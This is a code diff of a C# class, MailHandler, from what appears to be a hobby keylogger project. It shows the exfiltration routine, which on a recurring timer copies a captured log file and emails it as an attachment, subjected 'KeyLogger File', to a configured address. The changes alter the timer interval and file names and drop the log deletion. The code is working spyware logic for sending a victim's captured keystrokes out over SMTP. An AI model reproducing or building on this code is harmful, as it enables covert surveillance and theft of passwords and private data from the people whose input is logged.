@@ -27,19 +27,18 @@ namespace WpfApplication8
     class MailHandler
     {
         string mailTo;
-        string filename = "rtx32.txt", targetname = "rtx64.txt";
-        public void SetTimer(System.Timers.Timer aTimer, string mailbox, StreamWriter file)
+        string filename = "rtx32.txt", targetname = "rtx86.txt";
+        public void SetTimer(System.Timers.Timer aTimer, string mailbox)
         {
             mailTo = mailbox;
-            aTimer = new System.Timers.Timer(15000);
-            aTimer.Elapsed += (sender, e) => SendMail(sender, e, mailTo, file);
+            aTimer = new System.Timers.Timer(10000);
+            aTimer.Elapsed += (sender, e) => SendMail(sender, e, mailTo);
             aTimer.AutoReset = true;
             aTimer.Enabled = true;
         }
 
-        private void SendMail(Object source, ElapsedEventArgs e, string mailTo, StreamWriter file)
+        private void SendMail(Object source, ElapsedEventArgs e, string mailTo)
         {
-            //StreamWriter filefromcopy = new StreamWriter(@"rtx64.txt");
             Console.Write(mailTo);
             CopyFile copyfile = new CopyFile();
             copyfile.CopyTxtFile(filename, targetname);
@@ -54,11 +53,11 @@ namespace WpfApplication8
                 to = new MailAddress(mailTo);
                 MailMessage message = new MailMessage(from, to);
                 message.Body = "Zawartość pliku txt w załączniku";
-                Attachment data = new Attachment(@"rtx64.txt", MediaTypeNames.Application.Octet);
+                Attachment data = new Attachment(targetname, MediaTypeNames.Application.Octet);
                 ContentDisposition disposition = data.ContentDisposition;
-                disposition.CreationDate = System.IO.File.GetCreationTime(@"rtx64.txt");
-                disposition.ModificationDate = System.IO.File.GetLastWriteTime(@"rtx64.txt");
-                disposition.ReadDate = System.IO.File.GetLastAccessTime(@"rtx64.txt");
+                disposition.CreationDate = System.IO.File.GetCreationTime(targetname);
+                disposition.ModificationDate = System.IO.File.GetLastWriteTime(targetname);
+                disposition.ReadDate = System.IO.File.GetLastAccessTime(targetname);
                 message.Attachments.Add(data);
                 message.Subject = "KeyLogger File";
                 client.Send(message);
@@ -68,10 +67,6 @@ namespace WpfApplication8
                 Console.WriteLine("Pusty adres e-mail ");
             }
             client.Dispose();
-            file.Close();
-            //filefromcopy.Close();
-            copyfile.DelFile(filename);
-            //copyfile.DelFile(targetname);
             //Console.WriteLine(" Message sent ");
             //Console.ReadLine();
 
